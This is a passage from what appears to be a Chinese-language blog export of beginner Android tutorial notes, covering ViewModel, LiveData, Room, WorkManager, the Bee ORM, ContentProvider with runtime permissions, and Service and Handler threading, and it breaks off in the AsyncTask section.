向viewModel传递参数由于所有ViewModel的实例都是通过ViewModelProvider来获取的，因此我们没有任何地方可以向ViewModel的构造函数中传递参数。只能借助ViewModelProvider.Factory来实现
class MainViewModel(val countReserved: Int) : ViewModel() &#123;    var counter = countReserved&#125;class MainViewModelFactory(val countReserved: Int) : ViewModelProvider.Factory &#123;    override fun &lt;T : ViewModel&gt; create(modelClass: Class&lt;T&gt;): T &#123;        return MainViewModel(countReserved) as T    &#125;&#125;
这样子，ViewModel就可以接收一个参数了，然后通过factory去构建他。为什么这里可以创建了呢？因为create()方法的执行时机和Activity的生命周期无关，所以不会产生之前提到的问题：当activity被销毁后，viewmodel也一起销毁了。使用方法是：
viewModel = ViewModelProvider(           this,           MainViewModelFactory(countReserved)       )[MainViewModel::class.java]
只有通过这种方法创建才能传入参数，并且保证viewModel的声明周期与activity的声明周期相互独立。（这里你也可以使用object继承，而不用单独创建一个工厂类。
Lifecycles我们需要能够时刻感知到Activity的生命周期，以便在适当的时候进行相应的逻辑控制。可是而如果要在一个非Activity的类中去感知Activity的生命周期，应该怎么办呢？
LifecycleObserver是一个空方法接口，如果想要感知到Activity的生命周期，还得借助额外的注解功能才行.
class Myobserver : LifecycleObserver &#123;    @OnLifecycleEvent(Lifecycle.Event.ON_START)    fun activityStart() &#123;        Log.d(&quot;MyObserver&quot;, &quot;activityStart&quot;)    &#125;    @OnLifecycleEvent(Lifecycle.Event.ON_STOP)    fun activityStop() &#123;        Log.d(&quot;MyObserver&quot;, &quot;activityStop&quot;)    &#125;&#125;
然后再Activity的创建中lifecycle.addObserver(MyObserver())将我们构建的类添加进去，他就会接收到生命周期的信息，每当生命周期发生变化，他就会执行方法。但是这样子也只会被动的接收生命周期的改变。无法主动感知生命周期的变化
class MyObserver(val lifecycle: Lifecycle) : LifecycleObserver &#123; ...&#125;
只有把lifecycle对象传递进去，就可以再任意地方调用lifecycle.currentState来主动获取当前的生命周期状态。lifecycle.currentState返回的生命周期状态是一个枚举类型，一共有INITIALIZED、DESTROYED、CREATED、STARTED、RESUMED这5种状态类型
LiveData它可以包含任何类型的数据，并在数据发生变化的时候通知给观察者。他通常与viewModel一起使用问题：如果ViewModel的内部开启了线程去执行一些耗时逻辑，那么在点击按钮后就立即去获取最新的数据，得到的肯定还是之前的数据。也就是意味着，只有activity能够主动向viewModel索要数据，而不能通过viewModel主动向activity提供数据。而如果我们再veiwModel中存储activity的实例，又会导致生命周期过长，activity的内存占用无法释放。因此可以将数据交由LiveData包装，然后在activity中观察该数它。就可以主动的将变化通知给Activity了。
class MainViewModel(val countReserved: Int) : ViewModel() &#123;    var counter = MutableLiveData&lt;Int&gt;()    init &#123;        counter.value = countReserved    &#125;     fun plusOne()&#123;        val count = counter.value ?: 0         counter.value = count + 1    &#125;    fun clear()&#123;        counter.value = 0    &#125;&#125;
将数据通过MutableLiveData包装起来，它提供三个方法分别是getValue()、setValue()和postValue()方法。getValue()方法用于获取LiveData中包含的数据；setValue()方法用于给LiveData设置数据，但是只能在主线程中调用；postValue()方法用于在非主线程中给LiveData设置数据。然后在Activity中修改按钮的绑定事件
 binding.apply &#123;            plusOneBtn.setOnClickListener &#123;                viewModel.plusOne()            &#125;            clearBtn.setOnClickListener &#123;                viewModel.clear()            &#125;			//观察者，当检测到数据变化时，就会调用后面的方法。lambda函数中的参数就是value值            viewModel.counter.observe(this@MainActivity, Observer &#123; count -&gt;                infoText.text = count.toString()            &#125;)        &#125;    &#125;//当反转屏幕时,或者退出应用时。activity，将其存储起来    override fun onPause() &#123;        super.onPause()        sp.edit().apply &#123;            putInt(&quot;count_reserved&quot;, viewModel.counter.value ?: 0)        &#125;

observe()方法接收两个参数：第一个参数是一个LifecycleOwner对象，，Activity本身就是一个LifecycleOwner对象，因此直接传this就好；第二个参数是一个Observer接口，当counter中包含的数据发生变化时，就会回调到这里，因此我们在这里将最新的计数更新到界面上即可。提问：为什么这里不使用函数式API的写法呢？因为observe()方法接收的另一个参数LifecycleOwner也是一个单抽象方法接口。当一个Java方法同时接收两个单抽象方法接口参数时，要么同时使用函数式API的写法，要么都不使用函数式API的写法。由于我们第一个参数传的是this，因此第二个参数就无法使用函数式API的写法了。

比较推荐的做法是，永远只暴露不可变的LiveData给外部。这样在非ViewModel中就只能观察LiveData的数据变化，而不能给LiveData设置数据

class MainViewModel(val countReserved: Int) : ViewModel() &#123;    val counter:LiveData&lt;Int&gt;        get() = _counter        private val _counter = MutableLiveData&lt;Int&gt;()    init &#123;        _counter.value = countReserved    &#125;    fun plusOne() &#123;        val count = counter.value ?: 0        _counter.value = count + 1    &#125;    fun clear() &#123;        _counter.value = 0    &#125;&#125;
这是官方最推荐的写法。它无法修改counter的值
map和switchMapmap作用：将实际包含数据的LiveData和仅用于观察数据的LiveData进行转化。使用场景：当我们一个User对象中有姓名，年龄，地址等属性。而用户只需要知道姓名即可。年龄和地址都是不需要暴露的。此时如果暴露这些信息就不合适了。所以使用map可以将数据转化，如下：
class MainViewModel(val countReserved: Int) : ViewModel() &#123;    private val userLiveData = MutableLiveData&lt;User&gt;()    val userName:LiveData&lt;String&gt; = Transformations.map(userLiveData)&#123;        it.firstName+it.lastName    &#125;&#125;
当userLiveData的数据发生变化时，map()方法会监听到变化并执行转换函数中的逻辑，然后再将转换之后的数据通知给userName的观察者。从以前只有一个observer观察，到现在多了一个map也会观察数据的变化
swichMap他的使用场景只有一个，但也极为重要：如果你获取的LivaData对象不是从那唯一的对象中获取，而是每次都会新建一个返回的话。就会出现一个问题，”observere只会监测最开始出现的那个对象，之后的对象就即便出现也不会检测到”。所以需要使用swichMap，例子：
class MainViewModel(countReserved: Int) : ViewModel() &#123;        ...        private val userIdLiveData = MutableLiveData&lt;String&gt;()        val user: LiveData&lt;User&gt; = Transformations.switchMap(userIdLiveData) &#123; userId -&gt;            Repository.getUser(userId)        &#125;        fun getUser(userId: String) &#123;            userIdLiveData.value = userId        &#125;		fun refresh() &#123; 			refreshLiveData.value = refreshLiveData.value 		&#125;    &#125;
这里即便是调用刷新，refresh方法，都会被swichMap检测到，然后他会通知前台的observer这个数据已经被更改了。而且她也只会把最新的数据通知出去。之前的数据会被丢弃
Room他是一个成熟的ORM框架Entity。用于定义封装实际数据的实体类，每个实体类都会在数据库中有一张对应的表，并且表中的列是根据实体类中的字段自动生成的。Dao。Dao是数据访问对象的意思，通常会在这里对数据库的各项操作进行封装，在实际编程的时候，逻辑层就不需要和底层数据库打交道了，直接和Dao层进行交互即可。Database。用于定义数据库中的关键信息，包括数据库的版本号、包含哪些实体类以及提供Dao层的访问实例。他需要导入两个包和一个插件
apply plugin: &#x27;kotlin-kapt&#x27;dependencies &#123; ... implementation &quot;androidx.room:room-runtime:2.1.0&quot; kapt &quot;androidx.room:room-compiler:2.1.0&quot;&#125;
其中kotlin-kapt插件是用来启用注解功能的。具体框架
@Entitydata class User(var firstName: String, var lastName: String, var age: Int) &#123;    @PrimaryKey(autoGenerate = true)    var id: Long = 0&#125;@Daointerface UserDao &#123;    @Insert    fun insertUser(user: User): Long    @Update    fun updateUser(newUser: User)    @Query(&quot;select * from User&quot;)    fun loadAllUsers(): List&lt;User&gt;    @Query(&quot;select * from User where age &gt; :age&quot;)    fun loadUsersOlderThan(age: Int): List&lt;User&gt;    @Delete    fun deleteUser(user: User)    @Query(&quot;delete from User where lastName = :lastName&quot;)    fun deleteUserByLastName(lastName: String): Int&#125;@Database(version = 1, entities = [User::class])abstract class AppDatabase : RoomDatabase() &#123;    abstract fun userDao(): UserDao    companion object &#123;        private var instance: AppDatabase? = null        @Synchronized        fun getDatabase(context: Context): AppDatabase &#123;            instance?.let &#123;                return it            &#125;            return Room.databaseBuilder(                context.applicationContext,                AppDatabase::class.java, &quot;app_database&quot;            )                .build().apply &#123;                    instance = this                &#125;        &#125;    &#125;&#125;
AppDatabase类必须继承自RoomDatabase类，并且一定要使用abstract关键字将它声明成抽象类，然后提供相应的抽象方法原则上全局应该只存在一份AppDatabase的实例。这里使用了instance变量来缓存AppDatabase的实例，然后在getDatabase()方法中判断：如果instance变量不为空就直接返回，否则就调用Room.databaseBuilder()方法来构建一个AppDatabase的实例。databaseBuilder()方法接收3个参数，注意第一个参数一定要使用applicationContext，而不能使用普通的context，否则容易出现内存泄漏的情况第二个参数是AppDatabase的Class类型，第三个参数是数据库名，这些都比较简单。最后调用build()方法完成构建，并将创建出来的实例赋值给instance变量，然后返回当前实例即可。

由于数据库操作属于耗时操作，Room默认是不允许在主线程中进行数据库操作的，因此上述代码中我们将增删改查的功能都放到了子线程中。不过为了方便测试，Room还提供了一个更加简单的方法，如下所示:

Room.databaseBuilder(context.applicationContext, AppDatabase::class.java,&quot;app_database&quot;) .allowMainThreadQueries() .build()
这样子就允许在主线程中运行了。
数据库升级这个也比较麻烦，实例如下：
@Database(version = 2, entities = [User::class, Book::class])abstract class AppDatabase : RoomDatabase() &#123;    abstract fun userDao(): UserDao    abstract fun bookDao(): BookDao    companion object &#123;        val MIGRATION_1_2 = object : Migration(1, 2) &#123;            override fun migrate(database: SupportSQLiteDatabase) &#123;                database.execSQL(                    &quot;create table Book (id integer primary                            key autoincrement not null, name text not null,                    pages integer not null                )&quot;)            &#125;        &#125;        private var instance: AppDatabase? = null        fun getDatabase(context: Context): AppDatabase &#123;            instance?.let &#123;                return it            &#125;            return Room.databaseBuilder(                context.applicationContext,                AppDatabase::class.java, &quot;app_database&quot;            )                .addMigrations(MIGRATION_1_2)                .build().apply &#123;                    instance = this                &#125;        &#125;    &#125;&#125;
在companion object结构体中，我们实现了一个Migration的匿名类，并传入了1和 2这两个参数，表示当数据库版本从1升级到2的时候就执行这个匿名类中的升级逻辑。匿名类实例的变量命名也比较有讲究，这里命名成MIGRATION_1_2，可读性更高。由于我们要新增一张Book表，所以需要在migrate()方法中编写相应的建表语句。另外必须注意的是，Book表的建表语句必须和Book实体类中声明的结构完全一致，否则Room就会抛出异常。有时候，我们的升级不一定需要新建一张表，而只要新增一列，所以查看实例：
···val MIGRATION_2_3 = object : Migration(2, 3) &#123; override fun migrate(database: SupportSQLiteDatabase) &#123; database.execSQL(&quot;alter table Book add column author text not null default &#x27;unknown&#x27;&quot;) 	&#125; &#125; ··· .addMigrations(MIGRATION_1_2, MIGRATION_2_3)

WorkManager从4.4系统开始AlarmManager的触发时间由原来的精准变为不精准，5.0系统中加入了JobScheduler来处理后台任务，6.0系统中引入了Doze和App Standby模式用于降低手机被后台唤醒的频率,从8.0系统开始直接禁用了Service的后台功能，只允许使用前台Service。这么频繁的功能和API变更，让开发者就很难受了，到底该如何编写后台代码才能保证应用程序在不同系统版本上的兼容性呢？WorkManager可以根据操作系统的版本自动选择底层是使用AlarmManager实现还是JobScheduler实现，从而降低了我们的使用成本。另外，它还支持周期性任务、链式任务处理等功能，是一个非常强大的工具。它可以保证即使在应用退出甚至手机重启的情况下，之前注册的任务仍然将会得到执行，因此WorkManager很适合用于执行一些定期和服务器进行交互的任务，比如周期性地同步数据，等等。
基本用法先导入依赖
implementation &quot;androidx.work:work-runtime:2.2.0&quot;

，使用WorkManager注册的周期性任务不能保证一定会准时执行，这并不是bug，而是系统为了减少电量消耗，可能会将触发时间临近的几个任务放在一起执行，这样可以大幅度地减少CPU被唤醒的次数，从而有效延长电池的使用时间


定义一个后台任务，并实现具体的任务逻辑；
class SimpleWorker(context: Context, params: WorkerParameters) : Worker(context, params) &#123; override fun doWork(): Result &#123; Log.d(&quot;SimpleWorker&quot;, &quot;do work in SimpleWorker&quot;) return Result.success() &#125;&#125;
doWork()方法不会运行在主线程当中,可以用来执行耗时任务。成功就返回Result.success()，失败就返回Result.failure()

配置该后台任务的运行条件和约束信息，并构建后台任务请求；val request = OneTimeWorkRequest.Builder(SimpleWorker::class.java).build()val request = PeriodicWorkRequest.Builder(SimpleWorker::class.java, 15, TimeUnit.MINUTES).build()后一个代码端相比于前代码，多了个周期，会每15分钟执行一次。

将该后台任务请求传入WorkManager的enqueue()方法中，系统会在合适的时间运行。最后一步WorkManager.getInstance(context).enqueue(request)


处理复杂任务设置延时任务：
val request = OneTimeWorkRequest.Builder(SimpleWorker::class.java) .setInitialDelay(5, TimeUnit.MINUTES) .build()
添加标签:
val request = OneTimeWorkRequest.Builder(SimpleWorker::class.java) ... .addTag(&quot;simple&quot;) .build()
添加标签后，可以通过标签关掉该任务WorkManager.getInstance(this).cancelAllWorkByTag(&quot;simple&quot;)当然，即使没有标签，也可以通过id来取消后台任务请求：WorkManager.getInstance(this).cancelWorkById(request.id)使用id只能取消单个后台任务请求，而使用标签的话，则可以将同一标签名的所有后台任务请求全部取消，这个功能在逻辑复杂的场景下尤其有用。
设置任务重新执行：如果后台任务的doWork()方法中返回了Result.retry()那么是可以结合setBackoffCriteria()方法来重新执行任务
val request = OneTimeWorkRequest.Builder(SimpleWorker::class.java) ... .setBackoffCriteria(BackoffPolicy.LINEAR, 10, TimeUnit.SECONDS) .build()
Result.success()和Result.failure()又有什么作用？这两个返回值其实就是用于通知任务运行结果的
WorkManager.getInstance(this) 	.getWorkInfoByIdLiveData(request.id) 	.observe(this) &#123; workInfo -&gt; 		if (workInfo.state == WorkInfo.State.SUCCEEDED) &#123; 			Log.d(&quot;MainActivity&quot;, &quot;do work succeeded&quot;) 		&#125; else if (workInfo.state == WorkInfo.State.FAILED) &#123; 			Log.d(&quot;MainActivity&quot;, &quot;do work failed&quot;) 		&#125; 	&#125;

链式任务:
 val sync = ...val compress = ...val upload = ...WorkManager.getInstance(this) .beginWith(sync) .then(compress) .then(upload) .enqueue()
也就是说，如果某个后台任务运行失败，或者被取消了，那么接下来的后台任务就都得不到运行了
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android使用Bee框架使用数据库</title>
    <url>/posts/436594ce/</url>
    <content><![CDATA[
首先导入所需要的依赖项
// https://mvnrepository.com/artifact/org.teasoft/bee    implementation &#x27;org.teasoft:bee:2.1.7&#x27;// https://mvnrepository.com/artifact/org.teasoft/honey    implementation &#x27;org.teasoft:honey:2.1.7&#x27;// https://mvnrepository.com/artifact/org.teasoft/bee-ext    implementation &#x27;org.teasoft:bee-ext:2.1.7&#x27;    // https://mvnrepository.com/artifact/org.xerial/sqlite-jdbc    implementation &#x27;org.xerial:sqlite-jdbc:3.41.2.2&#x27;
分别是bee的三个官方库和一个sqlite驱动

然后配置bee.properties


bee.db.isAndroid=true#bee.db.driverName=org.sqlitebee.db.androidDbName=account.dbbee.db.androidDbVersion=1bee.osql.loggerType=androidLog#开启查询结果字段类型转换,将支持更多类型bee.osql.openFieldTypeHandler=true#如果允许删除和更新整张表,需要开启bee.osql.notDeleteWholeRecords=falsebee.osql.notUpdateWholeRecords=false#开启SQL语句回显bee.osql.showSQL=true

关键问题：如何让android打包bee.properties到软件中？
因为android的res目录下只存放符合android规范的一系列文件夹和文件。bee.properties无法直接放入文件中解决办法：在android的项目下，选择新建一个目录
我们再新建一个src\main\resources目录，把你的bee.properties放到这个目录中。这个目录会随着android的打包而一起打包。这样就完成了配置项的问题

然后创建你的数据库创建和升级工具
class YouAppCreateAndUpgrade() : CreateAndUpgrade &#123;    override fun onCreate() &#123;        Log.d(&quot;mysql&quot;,DdlToSql.toCreateTableSQL(User().javaClass))        Ddl.createTable(User().javaClass,true)    &#125;    override fun onUpgrade(oldVersion: Int, newVersion: Int) &#123;        if(newVersion==2) &#123;            Ddl.createTable(School().javaClass,true);            Log.i(&quot;onUpgrade&quot;, &quot;你在没有卸载的情况下，在线更新到版本:&quot;+newVersion);        &#125;    &#125;&#125;

提出问题，暂时没有解决关于数据库该如何升级的办法


创建你的主应用程序，并在AndridManifest中配置你的应用


import android.app.Applicationimport android.content.Contextimport org.teasoft.bee.android.CreateAndUpgradeRegistryimport org.teasoft.beex.android.ApplicationRegistryimport org.teasoft.beex.harmony.BeeConfigInitclass BeeApplication: Application() &#123;    override fun onCreate() &#123;        super.onCreate()        ApplicationRegistry.register(this)        CreateAndUpgradeRegistry.register(YouAppCreateAndUpgrade().javaClass)    &#125;&#125;
&lt;application			android:name=&quot;.BeeApplication&quot;			···
然后你就可以使用bee框架的各种方法去连接和使用数据库了

推荐到一些快速入门官方文档1   2

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>android</tag>
        <tag>bee框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(0)</title>
    <url>/posts/2a9bcd2f/</url>
    <content><![CDATA[IDEA是一款非常强大的编译器，而且大家常用的AndroidStudio就是基于IDEA开发出来的，因此无论是使用Android Studion还是IDEA都会非常的熟练，他们的快捷键等都几乎保持一致。因此无论是使用idea或者android studio都没有问题。这里我选择使用idea。就不多再下载一个编译器了。使用过程

首先需要安装android SDK他会要求你进行下载，当你下载完成后，你就可以使用idea开发android了
如果是旧UI的话，就可以在开发Android时自己选择模拟的设备了，如图而如果更换了新UI就不会显示这个，你需要通过更多工具获得选择这些工具后，他们就会出现在右栏或者底栏，就可以方便的使用了。
logcat的使用最重要的是他的筛选工具，他可以筛选log的等级，和包名

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android(开发开源库)</title>
    <url>/posts/b978a72/</url>
    <content><![CDATA[只要是编写一个库提供给其他的项目去使用，就可以统称为SDK开发。SDK开发多数情况下是以实现功能逻辑为主的，而不会有ui设计。SDK开发面向的用户群体从来都不是普通用户，而是其他开发者。
简化运行时权限APItypealias关键字可以用于给任意类型指定一个别名，如：typealias PermissionCallback = (Boolean, List&lt;String&gt;) -&gt; Unit
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(2)</title>
    <url>/posts/18adafad/</url>
    <content><![CDATA[Android四大组件分别是Activity,Service,BroadcastRecerver和ContentProvider。

其中Activity是所有Android应用程序的门面，你再前端看得到的都在这其中。

而Service就是在后台默默运行，即便用户退出了应用，Service也会在后台运行。

BroadcastReceiver允许你的应用接受来自各处的广播消息，比如电话，短信等，当然，你的应用也可以向外发出广播信息。

ContentProvider则为应用程序之间共享数据提供了可能，比如你想读取系统通讯录中的联系人，即想要通过ContentProvider来实现。


]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>四大组件</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(ContentProvider)不同应用共享数据</title>
    <url>/posts/3287078c/</url>
    <content><![CDATA[ContentProvider主要用于在不同的应用程序之间实现数据共享的功能
运行时权限这是ContentProvider能否使用的基础.运行时权限的意义：在旧版android中，所有的权限都是在应用安装时会直接声明出来，如果你接受这些条件就安装。否则拒绝安装就可以了。而这就会导致一些店大欺客的问题。比如：旧版微信就会申请几乎所有的权限。而你如果不接受你就不能使用微信。
所以运行时权限就有了他存在的意义：应用会在需要使用该权限时才会像用户发起申请，即便用户拒绝了，也可以正常使用其他功能。当然，并不是所有权限都需要在运行时申请，对于用户来说，不停地授权也很烦琐。Android现在将常用的权限大致归成了两类，一类是普通权限，一类是危险权限。对于普通权限，系统会帮我们自动授权。而危险权限都交给用户决定。以下是Android到Android10版本所有的危险权限：
运行时权限申请样例：
class FirstActivity : AppCompatActivity() &#123;    private lateinit var binding: ActivityFirstBinding    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        binding = ActivityFirstBinding.inflate(layoutInflater)        setContentView(binding.root)        binding.apply &#123;            callme.setOnClickListener &#123;                /**                 * 判断是否拥有拨打电话的权限                 * ContextCompat.checkSelfPermission()接收两个参数，第一个是context。第二个是具体的权限名                 * PackageManager.PERMISSION_GRANTED是个常量表示用户完成授权                 * ActivityCompat.requestPermissions()接收三个参数，第三个参数没有具体要求，只要是唯一值即可                 */                if (ContextCompat.checkSelfPermission(                        this@FirstActivity,                        android.Manifest.permission.CALL_PHONE                    ) != PackageManager.PERMISSION_GRANTED                ) &#123;                    ActivityCompat.requestPermissions(                        this@FirstActivity,                        arrayOf(android.Manifest.permission.CALL_PHONE),                        1                    )                &#125;else&#123;                    call()                &#125;            &#125;        &#125;    &#125;    /**     * 不难理解，所以不做解释     */    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array&lt;out String&gt;, grantResults: IntArray) &#123;        super.onRequestPermissionsResult(requestCode, permissions, grantResults)        when(requestCode)&#123;            1-&gt;&#123;                if(grantResults.isNotEmpty() &amp;&amp; grantResults[0] == PackageManager.PERMISSION_GRANTED)&#123;                    call()                &#125;else&#123;                    Toast.makeText(this@FirstActivity,&quot;You deny your Permission&quot;,Toast.LENGTH_LONG).show()                &#125;            &#125;        &#125;    &#125;    private fun call() &#123;        try &#123;            val intent = Intent(Intent.ACTION_CALL)            intent.data = Uri.parse(&quot;tel:10086&quot;)            startActivity(intent)        &#125; catch (e: Exception) &#123;            e.printStackTrace()        &#125;    &#125;&#125;

访问其他应用的数据ContentProvider的使用：

他想要获取数据就需要借助ContentResolver类。可以通过Context中的getContentResolver()方法获取实例。
ContentResolver类与SQLiteDatabase类似，也具有insert(),等四个增删改查方法。
但不同于SQLiteDatabase，他第一个参数接收的不是表名，而是Uri参数。它由三部分组成：协议，authority，path。authority是用于对不同的应用程序做区分的，一般为了避免冲突，会采用应用包名的方式进行命名。path就是对同一应用不同的表做区分，就像表名。它的比较标准的格式如下：content://com.example.app.provider/table1。只需要调用Uri.parse()方法，就可以将内容URI字符串解析成Uri对象了

query()    它与数据库的参数很像，就是第一个不是表名，而是Uri。而且他的参数会更加简单一点。  它返回的也是一个cursor对象，对于cursor对象，只需要遍历，并且按照列数完成对每一列的读取即可。
insert()  val values = contentValuesOf(&quot;column1&quot; to &quot;text&quot;, &quot;column2&quot; to 1)contentResolver.insert(uri, values)
  它接收是也是Uri对象和contentValues对象。
update()  val values = contentValuesOf(&quot;column1&quot; to &quot;&quot;)contentResolver.update(uri, values, &quot;column1 = ? and column2 = ?&quot;, arrayOf(&quot;text&quot;, &quot;1&quot;))
  这里使用了selection和selectionArgs参数来对想要更新的数据进行约束
delete()  contentResolver.delete(uri, &quot;column2 = ?&quot;, arrayOf(&quot;1&quot;))



构建自己的ContentProvider已知：只需要获得该应用程序的内容URI，然后借助ContentResolver进行增删改查操作就可以了，但是如何向外部提供接口并保证数据的安全？步骤：

新建一个类继承ContentProvider，然后重写其6个抽象方法。(1) onCreate()。初始化ContentProvider的时候调用。通常会在这里完成对数据库的创建和升级等操作，返回true表示ContentProvider初始化成功，返回false则表示失败。

(2) query()。从ContentProvider中查询数据。uri参数用于确定查询哪张表，projection参数用于确定查询哪些列，selection和selectionArgs参数用于约束查询哪些行，sortOrder参数用于对结果进行排序，查询的结果存放在Cursor对象中返回。
(3) insert()。向ContentProvider中添加一条数据。uri参数用于确定要添加到的表，待添加的数据保存在values参数中。添加完成后，返回一个用于表示这条新记录的URI。
(4) update()。更新ContentProvider中已有的数据。uri参数用于确定更新哪一张表中的数据，新数据保存在values参数中，selection和selectionArgs参数用于约束更新哪些行，受影响的行数将作为返回值返回。
(5) delete()。从ContentProvider中删除数据。uri参数用于确定删除哪一张表中的数据，selection和selectionArgs参数用于约束删除哪些行，被删除的行数将作为返回值返回。
(6) getType()。根据传入的内容URI返回相应的MIME类型。

uri解析一个标准的uri写法content://com.example.app.provider/table1这就表示调用方期望访问的是com.example.app这个应用的table1表中的数据。content://com.example.app.provider/table1/1表示调用方期望访问的是com.example.app这个应用的table1表中id为1的数据


*表示匹配任意长度的任意字符。
#表示匹配任意长度的数字。

一个能够匹配任意表的内容URI格式就可以写成：content://com.example.app.provider/*一个能够匹配table1表中任意一行数据的内容URI格式就可以写成：content://com.example.app.provider/table1/#
UriMatcher类有两个方法：

addURI()：接收三个参数分别把authority,path和一个自定义代码传进去
match()：接收一个uri对象作为参数。能够匹配到这个uri对象的自定义代码

URI所对应的MIME字符串主要由3部分组成，Android对这3个部分做了如下格式规定。

必须以vnd开头。
如果内容URI以路径结尾，则后接android.cursor.dir/；如果内容URI以id结尾，则后
接android.cursor.item/。
最后接上vnd..。


]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
  </entry>
  <entry>
    <title>Android入门(1)</title>
    <url>/posts/3380fc6e/</url>
    <content><![CDATA[目录结构Project项目默认你已经通过idea或者android studio生成了一个android程序了。那么你将会看到如下的目录结构

.gradle和.idea这两个目录下放置到都是Android Studio自动生成的文件，我们无需关心。
app项目中的代码，资源等内容都是放在这个目录下的，我们后面的开发也基本在这个目录下进行
build这个目录主要包括一些在编译时自动生成的文件，我们无需关心。
gradle如果你使用了gradle的wrapper的话，他就会有这个文件，这个文件下主要是gradle的包。
.gitgnore这个文件是用来将来的目录或文件排除在版本控制之外的。
build.gradle这个是项目全局的gradle构建脚本，通常这个文件的内容不需要修改。
gradle.properties这个文件是全局的gradle配置文件，在这里配置到属性将会影响到项目中所有的gradle编译脚本。
gradlew和gradlew.bat这两个文件是用来在命令行界面执行gradle命令的，其汇总gradlew实在Linux或者Mac系统中使用的，gradlew.bat是在Windows中使用的。
local.properties这个文件是用来指定本机的Android SDK路径，通常内容是自动生成的，我们并不需要修改，除非你本机的Android SDK位置发生了变化，那么将这个文件的路径改成新的位置即可。
setting.gralde这个文件用于指定项目中所有引用的模块。一般一个项目只有一个app模块，因此该文件中也只引入了app这一模块。通常情况下，模块的引入是自动完成的，需要我们手动引修改这个文件的场景比较少。

App模块

build这个目录和外层的build目录类似，也包含了一些在编译时自动生成的文件，不过他会更复杂，我们也不用考虑
libs如果你的项目中以后你用了第三方的jar包，就需要把这些jar包都放在libs目录下。它会被自动添加到项目的构建路径中。
androidTest此处是用来编写Android Test测试用的。
java这里是放置我们所有Java代码的（Kotlin代码也放这），展开该目录，你将看到系统会帮我们生成了对应的Activities文件。
res这个目录下会存放我们所有会用到的资源，包括我们在项目中使用到的所有图片，布局，字符串等资源。这个目录下也有很多子目录，图片放在drawable目录下，布局放在layout目录下，字符串放在values目录下，所以你不用担心会把整个res目录弄的乱糟糟的。
AndroidManifest.xml这是整个Android项目的配置文件，你再程序中定义的四大组件都需要在这个文件里注册，另外还可以在这个文件里给用用程序添加权限说明。
test也是用来编写Unit Test测试用例的。
.gitgnore略
app.imlidea自动生成的文件
build.gradle这是app模块的gradle构建脚本，这个文件会指定很多项目构建相关的配置，我们稍后会详细缝隙gradle构建脚本的具体内容。
proguard-rules.pro这个文件用于指定项目代码的混淆规则，当代码开发完成打包成安装包文件时，如果不希望代码被人破解，可以将代码混淆，让他人难以阅读

]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>目录结构</tag>
      </tags>
  </entry>
  <entry>
    <title>Android入门(Service的使用)</title>
    <url>/posts/9677f8db/</url>
    <content><![CDATA[Serviceservice是android实现程序后台运行的解决方案。当然它并不是独立运行，而是依赖于应用程序，应用程序停止时，他也会一起停止。Service并不会自动开启线程，所有的代码都是默认运行在主线程当中的。
Android多线程编程
在kotlin中开启线程的方式更加简单。它为你定义了顶层方法thread&#123;//方法体&#125;直接在其中写内容，然后他会被拉起为一个新线程。


更新UI：和许多其他的GUI库一样，Android的UI也是线程不安全的。也就是说，如果想要更新应用程序里的UI元素，必须在主线程中进行，否则就会出现异常。
所以android提供了一套异步消息处理机制：解决了在子线程进行UI操作的问题class MainActivity : AppCompatActivity() &#123;    val updateText = 1    val handle = object :Handler(Looper.getMainLooper())&#123;	//在这里处理UI的异步操作        override fun handleMessage(msg: Message) &#123;            when(msg.what)&#123;                updateText -&gt;&#123;                    binding.textView.text = &quot;Nice to meet you&quot;                &#125;            &#125;        &#125;    &#125;    private lateinit var binding: ActivityMainBinding    override fun onCreate(savedInstanceState: Bundle?) &#123;        super.onCreate(savedInstanceState)        binding = ActivityMainBinding.inflate(layoutInflater)        setContentView(binding.root)        binding.changeTextBtn.setOnClickListener &#123;            thread &#123;                val msg = Message()                msg.what = updateText                handle.sendMessage(msg)//将message对象发送过去            &#125;        &#125;    &#125;&#125;

异步消息处理机制原理Android中的异步消息处理主要由4个部分组成：Message、Handler、MessageQueue和Looper

MessageMessage是在线程之间传递的消息，它可以在内部携带少量的信息，用于在不同线程之间传递数据。上一小节中我们使用到了Message的what字段，除此之外还可以使用arg1和arg2字段来携带一些整型数据，使用obj字段携带一个Object对象。
HandlerHandler顾名思义也就是处理者的意思，它主要是用于发送和处理消息的。发送消息一般是使用Handler的sendMessage()方法、post()方法等，而发出的消息经过一系列地辗转处理后，最终会传递到Handler的handleMessage()方法中。
MessageQueueMessageQueue是消息队列的意思，它主要用于存放所有通过Handler发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个MessageQueue对象。
LooperLooper是每个线程中的MessageQueue的管家，调用Looper的loop()方法后，就会进入一个无限循环当中，然后每当发现MessageQueue中存在一条消息时，就会将它取出，并传递到Handler的handleMessage()方法中。每个线程中只会有一个Looper对象。

使用AsyncTask借助AsyncTask，即使你对异步消息处理机制完全不了解，也可以十分简单地从子线程切换到主线程基本用法：AsyncTask是一个抽象类，我们需要去继承他，同时它需要接收三个参数：

Params，在执行时需要传入的参数，用于在后台任务中使用
Progress，在后台任务执行时，如果需要在界面上显示当前的进度，则使用这里指定的泛型作为进度单位
Result。当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型。样例：class DownloadTask : AsyncTask&lt;Unit, Int, Boolean&gt;() &#123; ...&#125;
常用重写的四个方法：


onPreExecute()这个方法会在后台任务开始执行之前调用，用于进行一些界面上的初始化操作，比如显示一个进度条对话框等。

